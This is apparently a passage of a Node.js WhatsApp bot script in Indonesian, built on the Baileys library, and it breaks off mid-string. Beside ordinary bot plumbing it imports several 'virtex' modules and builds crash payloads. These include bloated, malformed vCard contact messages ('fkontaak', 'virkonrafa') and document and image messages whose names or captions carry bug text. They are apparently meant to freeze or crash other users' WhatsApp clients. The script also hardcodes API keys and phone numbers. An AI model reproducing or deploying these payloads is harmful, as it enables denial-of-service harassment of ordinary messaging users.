/** 

Yg Mau Sv Nomerku?

danta dev : wa.me/6281356484612
naze dev : wa.me/6285875158363

Minimal Kasih Cr kalo mau reupload😡

Kalau Sampai Ketemu Lagi Creator Bot
Yg Reupload Tanpa Kasih Cr 
Sc Akan Saya Encode

Base : Hisoka
Recode : Naze & Danta

**/

require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, MessageType, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const fetch = require('node-fetch')
const crypto = require('crypto')
const ms = require('parse-ms')
const toMs = require('ms')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const x = require('xfarr-api')
const mathjs = require('mathjs')
const maker = require('mumaker')
const ggs = require('google-it')
const thiccysapi = require('textmaker-thiccy')
const toHur = require('@develoka/angka-terbilang-js')
const { performance } = require('perf_hooks')
const caliph = require('caliph-api')
const hx = require("hxz-api")
const bocil = require("@bochilteam/scraper")
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const imgbbUploader = require('imgbb-uploader')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, mode, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, } = require("dhn-api");
const { virtex } = require('./virtex/virtexbug')
const { bug } = require('./virtex/botbug')
virgam = fs.readFileSync(`./src/virgam.jpeg`)
const { philips } = require('./virtex/philips')
const { buttonvirus } = require('./virtex/buttonvirus')
const { ngazap } = require('./virtex/ngazap')
const ntilink = JSON.parse(fs.readFileSync("./database/antilink.json"))
const setting = JSON.parse(fs.readFileSync('./settings.json'))
const kalimage = fs.readFileSync ('./image/dantaganz.jpg')
global.prem = require("./lib/premium")
const { mediafireDl } = require('./lib/mediafire.js')
const cerpen = require('./lib/cerpen.js')
const apikey = JSON.parse(fs.readFileSync('./apikey.json'))
const dhakey = apikey.DhaKey
const LeysKey = apikey.LeysApi
const ownerName = setting.OwnerName
ZeksApi = 'apivinz' // isi apikey 
Xteam = '99ae0852bef54e33' // apikey
lolkey = '682aeab645ed61cf137cf971' //apikey
const { docbug } = require('./virtex/docbug')
const { buttonfour } = require('./virtex/buttonfour')

const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const barat = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const tengah = moment.tz('Asia/Makassar').format('HH:mm:ss')
const timur = moment.tz('Asia/Jayapura').format('HH:mm:ss')
const nyoutube = ('© Danta Dev')  //ubah di config biar ngk emror
const ini_mark = `0@s.whatsapp.net`
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ownernya = ownernomer + '@s.whatsapp.net'

//TIME
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')  
 if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam 🌃'
 }
 if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Sore 🌇'
 }
 if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore 🌆'
 }
 if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang '
 }
 if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌄„'
 }
 if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌅'
 } 
    
// read database
let tebaklagu = db.data.game.tebaklagu = []
let _family100 = db.data.game.family100 = []
let kuismath = db.data.game.math = []
let tebakgambar = db.data.game.tebakgambar = []
let tebakkata = db.data.game.tebakkata = []
let caklontong = db.data.game.lontong = []
let caklontong_desk = db.data.game.lontong_desk = []
let tebakkalimat = db.data.game.kalimat = []
let tebaklirik = db.data.game.lirik = []
let tebaktebakan = db.data.game.tebakan = []
let vote = db.data.others.vote = []

module.exports = danta = async (danta, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[.]/gi.test(body) ? body.match(/^[.]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const from = mek.key.remoteJid
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await danta.decodeJid(danta.user.id)
        const isCreator = [danta.user.id, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const AntiLink = m.isGroup ? ntilink.includes(from) : false 
        const itsMe = m.sender == danta.user.id ? true : false
        const apikey = JSON.parse(fs.readFileSync('./apikey.json'))
        const text = q = args.join(" ")
        const ferdantar1 = ['1','2','3','4','5','6','7','8','9']
            const ferdantar2 = ['1','2','3','4','5','6','7','8','9']
            const ferdantar3 = ferdantar1[Math.floor(Math.random() * (ferdantar1.length))]
            const ferdantar4 = ferdantar2[Math.floor(Math.random() * (ferdantar2.length))] 
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const isMedia = /image|video|sticker|audio/.test(mime)
        const sender = m.isGroup ? (mek.key.participant ? mek.key.participant : mek.participant) : mek.key.remoteJid
	 
	
	        // const doc
const doc = { 
key: {
participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `DD EXE BOT${ngazap(prefix)}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}

	// Target
const reply = (teks) => {
return danta.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC Nase Dev`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m })
} 

const anjay = (teks) => {
 danta.sendMessage(m.chat, { image: kalimage, caption: teks, contextInfo:{"externalAdReply": {"title": `SC Naze Dev`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/Nasedev`,
thumbnailUrl: 'https://telegra.ph/file/17c9eea705efb85c9fa37.jpg', 
thumbnail: kalimage,
}
}}, { quoted: m})
}
	
	    //Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: '©Danta Dev', orderTitle: 'memek', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: '©Danta Dev',jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":'©Danta Dev', "h": `Hmm`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': '©Danta Dev', 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": "𝐃𝐚𝐫𝐤 𝐌𝐃", "caption": '©Danta Dev', 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":`${pushname}`, "h": `Hmm`,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: 'Danta Dev',jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': '𝐃𝐚𝐫𝐤 𝐌𝐃', 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Danta Dev,;;;\nDanta Dev 𝑮𝒂𝒏𝒛\nitem1.TEL;waid=6282193252764:6282193252764\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": 'Danta Dev',"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./image/danta.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}
		
		// virtex jobot
const virgamZ = { 
key: { 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption": `${bug}`, 
"jpegThumbnail": virgam
} 
} 
}

const deploy = (teks) => {
  danta.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
}

        // Group
        const groupMetadata = m.isGroup ? await danta.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPremium = isCreator || isCreator || prem.checkPremiumUser(m.sender, premium);
        const sotoy = [
		'🍊 : 🍒 : 🍐',
		'🍒 : 🔔 : 🍊',
		'🍇 : 🍇 : 🍇',
		'🍊 : 🍋 : 🔔',
		'🔔 : 🍒 : 🍐',
		'🔔 : 🍒 : 🍊',
        '🍊 : 🍋 : 🔔',		
		'🍐 : 🍒 : 🍋',
		'🍐 : 🍐 : 🍐',
		'🍊 : 🍒 : 🍒',
		'🔔 : 🔔 : 🍇',
		'🍌 : 🍒 : 🔔',
		'🍐 : 🔔 : 🔔',
		'🍊 : 🍋 : 🍒',
		'🍋 : 🍋 : 🍌',
		'🔔 : 🔔 : 🍇',
		'🔔 : 🍐 : 🍇',
		'🔔 : 🔔 : 🔔  Win',
		'🍒 : 🍒 : 🍒 Win',
		'🍌 : 🍌 : 🍌 Lose'
		]
	
	const fkontaak = { key: { participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝑨𝑳𝑽𝑰𝑻𝑶 𝟔𝟔𝟔${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:𝑨𝑳𝑽𝑰𝑻𝑶 𝟔𝟔𝟔\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
	const virkonrafa = { key: { participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© RAFA GANZ 🔥${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:RAFA GANZ 🔥\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 